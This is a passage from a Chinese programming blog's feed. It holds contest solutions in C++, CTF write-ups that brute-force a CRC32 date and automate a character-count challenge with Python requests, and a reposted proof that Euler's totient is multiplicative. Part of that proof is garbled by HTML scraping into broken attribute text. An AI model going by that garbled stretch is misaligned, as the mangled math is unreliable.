class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1e6</span>+<span class="number">10</span>;</div><div class="line"><span class="keyword">int</span> n,m;</div><div class="line"><span class="keyword">int</span> a[N],s[N],t[N],d[N],mk[N];</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> &amp;x)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">char</span> c=getchar();</div><div class="line">x=<span class="number">0</span>;</div><div class="line"><span class="keyword">while</span> (!(c&gt;=<span class="string">'0'</span>&amp;&amp;c&lt;=<span class="string">'9'</span>||c==<span class="string">'-'</span>)) c=getchar();</div><div class="line"><span class="keyword">int</span> f=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (c==<span class="string">'-'</span>) &#123;</div><div class="line">f=<span class="number">1</span>;</div><div class="line">c=getchar();</div><div class="line">&#125;</div><div class="line"><span class="keyword">while</span> (c&gt;=<span class="string">'0'</span>&amp;&amp;c&lt;=<span class="string">'9'</span>) &#123;</div><div class="line">x=x*<span class="number">10</span>+c-<span class="string">'0'</span>;</div><div class="line">c=getchar();</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (f) x=-x;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> x)</span></span></div><div class="line">&#123;</div><div class="line"><span class="built_in">memset</span>(mk,<span class="number">0</span>,<span class="keyword">sizeof</span>(mk));</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=x;i++)</div><div class="line">mk[s[i]]+=d[i],mk[t[i]+<span class="number">1</span>]-=d[i];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>,sum=<span class="number">0</span>;i&lt;=n;i++)&#123;</div><div class="line">sum+=mk[i];</div><div class="line"><span class="keyword">if</span> (sum&gt;a[i]) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> l=<span class="number">1</span>,r=m+<span class="number">1</span>;</div><div class="line"><span class="keyword">while</span> (l&lt;r)&#123;</div><div class="line"><span class="keyword">int</span> m=(l+r)&gt;&gt;<span class="number">1</span>;</div><div class="line"><span class="keyword">if</span> (!check(m)) r=m;</div><div class="line"><span class="keyword">else</span> l=m+<span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> r;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">read(n);</div><div class="line">read(m);</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line">read(a[i]);</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</div><div class="line">read(d[i]),read(s[i]),read(t[i]);</div><div class="line"><span class="keyword">int</span> ans=solve();</div><div class="line"><span class="keyword">if</span> (ans&gt;m) <span class="built_in">puts</span>(<span class="string">"0"</span>);</div><div class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"-1\n%d\n"</span>,ans);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>线段树的复杂度是 O(MlogN)<br>二分答案+差分的复杂度是 O(NlogM)<br>【其实一样<br>当然线段树常数肯定大一点，比赛的时候也有很多人线段树没满分。<br>不得不说 NOIP 确实是希望你巧妙的解题的。。。</p><p>最后再推荐一下 codevs 。。。<br>大家公认的界面领先 OJ 界至少3年 ←_←<br>还有一个原因就是。。。对蒟蒻比较友好。。。</p><p>=========2018/02/22=========<br>codevs 太凉了，推荐一下洛谷，贼6好吧</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Crypto-特殊的日子</title>
      <url>/blog/2016/08/18/crypto-special-day/</url>
      <content type="html"><![CDATA[<h3 id="特殊的日子"><a href="#特殊的日子" class="headerlink" title="特殊的日子"></a><a href="http://ctf.idf.cn/index.php?g=game&amp;m=article&amp;a=index&amp;id=50" target="_blank" rel="noopener">特殊的日子</a></h3><blockquote><p>每个人的一生中都会或多或少有那么几个对自己很重要的日子，比如对于我来说，这一天就很重要。<br>答案格式wctf{日期} //友情提示，此题需要<strong>暴力破解</strong>，但只是爆破这段密文，不是爆破这个网站。。 = =！</p></blockquote><p>题目里提到了暴力破解，应该就是某种不可逆的编码了。我学的比较少，刚开始想到的当然是MD5，不过MD5显然没有8位的。。。</p><p>后来直接查了查，发现是CRC32，这个好像在压缩包那边看到过。然后写程序，CRC32在 zlib 里面。</p><blockquote><h5 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h5><p>To generate the same numeric value across all Python versions and platforms, use crc32(data) &amp; 0xffffffff. If you are only using the checksum in packed binary format this is not necessary as the return value is the correct 32-bit binary representation regardless of sign.</p></blockquote><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> zlib</div><div class="line"></div><div class="line">def crc32(para):</div><div class="line">    res = zlib.crc32(para.encode(<span class="string">"utf-8"</span>))</div><div class="line">    <span class="keyword">return</span> <span class="string">'%x'</span> % (res &amp; <span class="number">0xffffffff</span>)</div><div class="line"></div><div class="line">std = <span class="string">'4D1FAE0B'</span>.lower()</div><div class="line"><span class="keyword">for</span> <span class="built_in">year</span> in range(<span class="number">1500</span>,<span class="number">3000</span>):</div><div class="line">    <span class="keyword">for</span> <span class="built_in">month</span> in range(<span class="number">1</span>,<span class="number">13</span>):</div><div class="line">        <span class="keyword">for</span> <span class="built_in">day</span> in range(<span class="number">1</span>,<span class="number">32</span>):</div><div class="line">            syyyy = <span class="built_in">str</span>(<span class="built_in">year</span>)</div><div class="line">            smm = <span class="built_in">str</span>(<span class="built_in">month</span>)</div><div class="line">            <span class="keyword">if</span> <span class="built_in">month</span> &lt; <span class="number">10</span>:</div><div class="line">                smm = <span class="string">'0'</span> + smm</div><div class="line">            sdd = <span class="built_in">str</span>(<span class="built_in">day</span>)</div><div class="line">            <span class="keyword">if</span> <span class="built_in">day</span> &lt; <span class="number">10</span>:</div><div class="line">                sdd = <span class="string">'0'</span> + sdd</div><div class="line">            now = syyyy + smm + sdd</div><div class="line">            <span class="keyword">if</span> crc32(now) == std:</div><div class="line">                <span class="built_in">print</span>(now)</div></pre></td></tr></table></figure><p>还看到有一种高端的写法：</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> zlib</div><div class="line">def crc32(st):</div><div class="line">    crc = zlib.crc32(st.encode(<span class="string">'utf-8'</span>))</div><div class="line">    <span class="keyword">if</span> crc &gt; <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">"%x"</span> % (crc &amp; <span class="number">0xffffffff</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">"%x"</span> % (crc &amp; <span class="number">0xffffffff</span>)</div><div class="line">    </div><div class="line">#生成年<span class="string">'1000'</span>~<span class="string">'3000'</span></div><div class="line"><span class="built_in">year</span> = [<span class="built_in">str</span>(i) <span class="keyword">for</span> i in range(<span class="number">1000</span>,<span class="number">3000</span>)]</div><div class="line">#生成月<span class="string">'01'</span>~<span class="string">'12'</span></div><div class="line"><span class="built_in">month</span> = [<span class="built_in">str</span>(i) <span class="keyword">if</span> i&gt;<span class="number">9</span> <span class="keyword">else</span> (<span class="built_in">str</span>(<span class="number">0</span>)+<span class="built_in">str</span>(i)) <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">13</span>) ]</div><div class="line">#生成日<span class="string">'01'</span>~<span class="string">'31'</span></div><div class="line"><span class="built_in">day</span> = [<span class="built_in">str</span>(i) <span class="keyword">if</span> i&gt;<span class="number">9</span> <span class="keyword">else</span> (<span class="built_in">str</span>(<span class="number">0</span>)+<span class="built_in">str</span>(i)) <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">32</span>) ]</div><div class="line">    </div><div class="line">#题目所给</div><div class="line">realDate = <span class="string">'4D1FAE0B'</span>.lower()</div><div class="line">    </div><div class="line">#穷举日期计算crc32值然后与题目给的值进行比对，一样则输出</div><div class="line"><span class="keyword">import</span> itertools</div><div class="line">#利用itertools.product()生成年月日的所有组合</div><div class="line"><span class="keyword">for</span> item in itertools.product(<span class="built_in">year</span>,<span class="built_in">month</span>,<span class="built_in">day</span>):</div><div class="line">    date = <span class="string">''</span>.<span class="built_in">join</span>(item)</div><div class="line">    <span class="keyword">if</span> crc32(date) == realDate:</div><div class="line">        <span class="built_in">print</span>(date)</div></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PPC-字符统计</title>
      <url>/blog/2016/08/18/ppc-char-accounting/</url>
      <content type="html"><![CDATA[<h3 id="字符统计"><a href="#字符统计" class="headerlink" title="字符统计"></a><a href="http://ctf.idf.cn/index.php?g=game&amp;m=article&amp;a=index&amp;id=37" target="_blank" rel="noopener">字符统计</a></h3><p>题意也没什么好说的，主要是找了找 python 好用的 http 请求库，发现 requests 真的是很好用啊。。。还有就是一定要<strong>看清楚表单</strong>。。。</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> string</div><div class="line">    </div><div class="line">cookie = &#123;<span class="string">'Cookie'</span> : <span class="string">'wctf_think_language=zh-CN;PHPSESSID=ltbxxxxxxxxxxxxxxxxxxxxfl6'</span>&#125;</div><div class="line">r = requests.<span class="built_in">get</span>(<span class="string">"http://ctf.idf.cn/game/pro/37/"</span>, cookies = cookie)</div><div class="line">    </div><div class="line"><span class="built_in">text</span> = re.search(r<span class="string">'&lt;hr /&gt;\s(.*)\s&lt;hr /&gt;'</span>, r.<span class="built_in">text</span>, re.S).group(<span class="number">1</span>)</div><div class="line">res = <span class="string">""</span></div><div class="line">res += <span class="built_in">str</span>(<span class="built_in">text</span>.count(<span class="string">'w'</span>))</div><div class="line">res += <span class="built_in">str</span>(<span class="built_in">text</span>.count(<span class="string">'o'</span>))</div><div class="line">res += <span class="built_in">str</span>(<span class="built_in">text</span>.count(<span class="string">'l'</span>))</div><div class="line">res += <span class="built_in">str</span>(<span class="built_in">text</span>.count(<span class="string">'d'</span>))</div><div class="line">res += <span class="built_in">str</span>(<span class="built_in">text</span>.count(<span class="string">'y'</span>))</div><div class="line"><span class="built_in">print</span>(res)</div><div class="line">    </div><div class="line">payload = &#123;<span class="string">'anwser'</span>:res&#125;</div><div class="line">r = requests.post(<span class="string">"http://ctf.idf.cn/game/pro/37/"</span>, cookies = cookie, data = payload)</div><div class="line"><span class="built_in">print</span>(r.<span class="built_in">text</span>)</div></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>欧拉函数为什么是积性函数</title>
      <url>/blog/2016/07/20/euler-function/</url>
      <content type="html"><![CDATA[<p><span style="color: red">以下全文转载自：<a href="http://www.cnblogs.com/372465774y/archive/2012/10/16/2726282.html" target="_blank" rel="noopener">http://www.cnblogs.com/372465774y/archive/2012/10/16/2726282.html</a></span></p><p>//    下面是百度上找的错误证明<br>函数的积性即：若m,n互质，则φ(mn)=φ(m)φ(n)。由“m,n互质”可知m,n无公因数，</p><p>所以φ(m)φ(n)=m(1-1/p1)(1-1/p2)(1-1/p3)…(1-1/pn)·n(1-1/p1’)(1-1/p2’)(1-1/p3’)…(1-1/pn’)，//这里已经用了计算公式，而计算公式是需要先有积性前提才推导的</p><p>其中p1,p2,p3…pn为m的质因数，p1’,p2’,p3’…pn’为n的质因数，而m,n无公因数，<br>所以p1,p2,p3…pn，p1’,p2’,p3’…pn’互不相同，<br>所以p1,p2,p3…pn，p1’,p2’,p3’…pn’均为mn的质因数且为mn质因数的全集，<br>所以φ(mn)=mn(1-1/p1)(1-1/p2)(1-1/p3)…(1-1/pn)(1-1/p1’)(1-1/p2’)(1-1/p3’)…(1-1/pn’)，<br>所以φ(mn)=φ(m)φ(n)。</p><p>查了很多资料会证明了：<br>// 证明：<br>  在证明前先了解下以下知识：<br>  (a,b)代表最大公约数,[a,b]代表最小公倍数<br>  m|(a-b) &lt;=&gt; a≡b (mod m)<br>  a=pm+r  (0&lt;=r&lt;m)<br>  b=qm+r  (0&lt;=r<m) 由此可以推出：="" 性质1：a≡a（mod="" m），（反身性）="" 这个性质很显然.因为a-a="0=m·0。" 性质2：若a≡b（mod="" m），那么b≡a（mod="" m），（对称性）。="" 性质3：若a≡b（mod="" m），b≡c（mod="" m），那么a≡c（mod="" m），（传递性）。="" 性质4：若a≡b（mod="" m），c≡d（mod="" m），那么a±c≡b±d（mod="" m），（可加减性）。="" 性质5：若a≡b（mod="" m），那么ac≡bd（mod="" m）（可乘性）。="" 证明="" ：m|(a-b)="" ,="" m|(c-d)="" 设="" a-b="km" c-d="lm" (ac-bd)="klm^2+(b+d)m" =="">m|(ac-bd)<br>  性质6：若a≡b（mod m），那么an≡bn（mod m），（其中n为自然数）。<br>   证明 ： m|(a-b) =&gt; m|n*(a-b)<br>  性质7：若ac≡bc（mod m），（c，m）=1，那么a≡b（mod m），（记号（c，m）表示c与m的最大公约数）。<br>   证明 ： m|c(a-b) d=(m,c)=&gt;m/d|(a-b) =&gt; a≡b（mod m/d）=&gt;当 d=1时 即（c,m）=1上面结论成立<br>  性质8：若a≡b（mod m），那么a的n次方和b的n次方也对于m同余<br>   证明 ：a^n-b^k=(a-b)(a^(n-1)+a^(n-2)b…..b^(n-1)) +m|(a-b) ==&gt;m|(a^n-b^n)<br>  性质9：若 a≡b(mod m1) a≡b(mod m2)…. a≡b(mod mi) 则 a≡b(mod [m1,m2,..mi])<br>   证明：m1 |(a-b) m2|(a-b) ..mi|(a-b)  =&gt;[m1,m2…mi]|(a-b) (因为 a-b里面含了 m集合的所有因子和每个因子的最大个数)<br>  推论 m1,m2..mi两两互质 则 a≡b(mod m1m2..mi);</m)></p><p>  定义 ： X 代表 M 简化剩余系  个数φ(M)  （有关简化正余系含义，百度吧）<br>         Y 代表 N 简化剩余系   个数φ(N)<br>         xi 代表X的元素 yj代表Y的元素 </p><p>  下面证明： φ(MN)=φ(M)φ(N) 其中(M,N)=1<br>  我们需要证明<br>  A: (xiN+yjM,MN)=1, xiN+yjM 代表的集合元素两两不在同一剩余系里 这样个数肯定是φ(M)φ(N)个了<br>  B: xiN+yM 可以代表 MN 的简化剩余系每个元素</p><p>  证明 A：<br>   (xi,M)=1; =&gt; (xiN,M)=1; =&gt;(xiN+yiM,M)=1;    ….1<br>   (yi,N)=1; =&gt; (yiM,N)=1; =&gt;(yiM+xiN,N)=1;    ….2<br>  由 1,2 =&gt; (xiN+yiM,MN)=1;    上面都是由数之间互质才推导的</p><p>   xiN+yjM≡xkN+ylM (mod MN)<br>=&gt; xiN+yjM≡xkN+ylM (mod M)<br>=&gt; xiN≡xkN (mod M)<br> 由性质 7 =&gt;xi≡xk (mod M)=&gt; i=k 同理 j=l 所以 xiN+yjM 代表的集合元素两两不在同一剩余系里<br>  证明 B:<br>   设 Z 是MN 的简化剩余系的集合的任意某个元素<br>   由于 （N,M）=1 =&gt; 存在 x0,y0 –&gt; Mx0+Ny0=1  =&gt; Mx0Z+Ny0Z=Z<br>   =&gt;存在 x,y –&gt; Mx+Ny=Z ……1<br>   (Z,MN)=1; =&gt;(Mx+Ny,M)=1; =&gt;(Ny,M)=1; =&gt;(y,M)=1 =&gt;y≡xi (mod M) 同理可得 x=yj (mod N)<br>    y≡xi (mod M) =&gt; Ny≡Nxi (mod MN) 同理 Mx=Myj (mod MN)<br>  根据同余性质<br>  Ny+Mx=Myj+Nxi (mod MN)<br>  =&gt; Z=xiN+yjM  (mod MN)<br>  所 MN 的简化剩余系每个元素都可以用 xiN+yjM表示<br> 综上 xiN+yjM 有 φ(M)φ(N)个元素  且每个与 MN互质，xiN+yjM两两不在同一剩余系里面<br> 可得 φ(MN)=φ(M)φ(N) 其中(M,N)=1<br><a href="http://www.cppblog.com/RyanWang/archive/2009/07/19/90512.aspx?opt=admin" target="_blank" rel="noopener">http://www.cppblog.com/RyanWang/archive/2009/07/19/90512.aspx?opt=admin</a></p><p>E(x)表示比x小的且与x互质的正整数的个数。</p><ul><li>若p是素数，E(p)=p-1。</li><li>E(p^k)=p^k-p^(k-1)=(p-1)*p^(k-1)<br>证：令n=p^k,小于n的正整数数共有n-1即(p^k-1)个,其中与p不质的数共[p^(k-1)-1]个(分别为1*p,2*p,3*p…p(p^(k-1)-1))。<br>所以E(p^k)=(p^k-1)-(p^(k-1)-1)=p^k-p^(k-1).得证。</li><li>若ab互质，则E(a*b)=E(a)*E(b)，欧拉函数是积性函数.</li><li>对任意数n都可以唯一分解成n=p1^a1*p2^a2*p3^a3*…*pn^an(pi为素数).<br>则E(n)=E(p1^a1)*E(p2^a2)*E(p3^a3)*…*E(pn^an)<br>   =(p1-1)*p1^(a1-1)*(p2-1)*p2^(a2-1)*…*(pn-1)*pn^(an-1)<br>   =(p1^a1*p2^a2*p3^a3*…*pn^an)*[(p1-1)*(p2-1)*(p3-1)*…*(pn-1)]/(p1*p2*p3*…*pn)<br>   =n<em>(1-1/p1)</em>(1-1/p2)<em>…</em>(1-1/pn)<ul><li>E(p^k)    =(p-1)<em>p^(k-1)=(p-1)</em>p^(k-2)<em>p<br>E(p^(k-1))=(p-1)</em>p^(k-2)<br>-&gt;当k&gt;1时，E(p^k)=E(p<em>p^(k-1))=E(p^(k-1))</em>p.<br>(当k=1时，E(p)=p-1.)<br>由上式: 设P是素数，<br>若p是x的约数，则E(x<em>p)=E(x)</em>p.<br>若p不是x的约数，则E(x<em>p)=E(x)</em>E(p)=E(x)*(p-1).<br>小记：</li></ul></li></ul><p>d=gcd(a,b);  a’d=a b’d=b (a’,b’)=1<br>要 d=gcd (b,a-qb) 要成立  则(b’,a’-qb’)=1<br>证明 (b’,a’-qb’)=1;<br>假设 b’,a’-qb’ 不互质 则 设 b’=kd’ a’-qb’=ld’ d’&gt;1<br>则 a’-q(kd’)=ld’ a’=(qk+l)d’ 与 (a’,b’)矛盾 </p><p>问题描述：<br>给出一个N，求1..N中与N互质的数的和</p><p>if gcd(n,i)=1 then gcd(n,n-i)=1 (1&lt;=i&lt;=n)</p><p>反证法：<br>如果存在K!=1使gcd(n,n-i)=k,那么(n-i)%k==0<br>而n%k=0<br>那么必须保证i%k=0<br>k是n的因子,如果i%k=0那么gcd(n,i)=k,矛盾出现;<br>于是问题变的非常简单<br>ANS=N<em>phi(N)/2<br>i,n-i总是成对出现，并且和是n<br>于是可能就有人问了，如果存在n-i=i那不是重复计算？<br>答案是不会<br>因为:<br>n=2</em>i-&gt;i=n/2<br>1.如果n是奇数，那么n!=2<em>i,自然也不存在n-i=i和重复计算之说<br>2.如果n是偶数,n=2</em>i成立,gcd(n,n/2)必然为n的一个因子,这个因子为1当且仅当n==2<br>于是对于n&gt;2的偶数，绝对不存在gcd(n,n/2)=1所以更别说什么重复计算了<br>对于n==2<br>ans=2*1/2=1<br>正好也满足</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CCCC初赛 关于堆的判断</title>
      <url>/blog/2016/07/13/gplt-L2-012/</url>
      <content type="html"><![CDATA[<p><a href="https://www.patest.cn/contests/gplt/L2-012" target="_blank" rel="noopener">https://www.patest.cn/contests/gplt/L2-012</a><br>题意就不用我说了<br>比赛中写了个丑的不行的程序。。。<br>于是后来又写了一个非常STL风格的<br>想了想还是丢到博客了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; a;</div><div class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pos;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getint</span><span class="params">(<span class="built_in">string</span> s)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">stringstream</span> ss;</div><div class="line">    ss&lt;&lt;s;</div><div class="line">    <span class="keyword">int</span> res;</div><div class="line">    ss&gt;&gt;res;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">right</span><span class="params">(<span class="built_in">string</span> &amp;s)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (s.find(<span class="string">"root"</span>)!=<span class="built_in">string</span>::npos)</div><div class="line">        <span class="keyword">return</span> (pos[getint(s)]==<span class="number">1</span>);</div><div class="line">    <span class="keyword">int</span> p = s.find_first_of(<span class="string">"-1234567890"</span>,s.find(<span class="string">" "</span>));</div><div class="line">    <span class="keyword">int</span> x = getint(s);</div><div class="line">    <span class="keyword">int</span> y = getint(s.substr(p,s.size()-p));</div><div class="line">    <span class="keyword">if</span> (s.find(<span class="string">"parent"</span>)!=<span class="built_in">string</span>::npos)</div><div class="line">        <span class="keyword">return</span> (pos[x]==pos[y]&gt;&gt;<span class="number">1</span>);</div><div class="line">    <span class="keyword">if</span> (s.find(<span class="string">"child"</span>)!=<span class="built_in">string</span>::npos)</div><div class="line">        <span class="keyword">return</span> (pos[x]&gt;&gt;<span class="number">1</span>==pos[y]);</div><div class="line">    <span class="comment">//contains "siblings"</span></div><div class="line">    <span class="keyword">return</span> (pos[x]&gt;&gt;<span class="number">1</span>==pos[y]&gt;&gt;<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,m,i,x;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m);</div><div class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</div><div class="line">        a.push_back(x);</div><div class="line">        push_heap(a.begin(),a.end(),greater&lt;<span class="keyword">int</span>&gt;());</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;n;i++) pos[a[i]]=i+<span class="number">1</span>;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"\n"</span>);</div><div class="line">    <span class="keyword">while</span> (m--)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">string</span> s;</div><div class="line">        getline(<span class="built_in">cin</span>,s);</div><div class="line">        <span class="keyword">if</span> (right(s)) <span class="built_in">puts</span>(<span class="string">"T"</span>);</div><div class="line">        <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">"F"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>广东工业大学（GDUT）2016校赛决赛</title>
      <url>/blog/2016/04/21/2016-gdut/</url>
      <content type="html"><![CDATA[<p><a href="http://gdutcode.sinaapp.com/problemset.php?page=2" target="_blank" rel="noopener">http://gdutcode.sinaapp.com/problemset.php?page=2</a><br>从1169~1175题</p><p>本次代码大多基于 takio 的题解 ，自己看吧。。。<br>（堆在我的 Github 上了。。。以后题解都不堆网盘了）<br>本文准备更新一些本人遇到的问题。。。</p><p>A 一直没写出来。。。<br>现在(2016/7/13)终于想起来<br>又要打怪又要遍历不会处理<br>简略的也讲不清楚。。。<br>这个是我根据takio巨的代码改造的 <em>(:з」∠)</em></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span> </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span 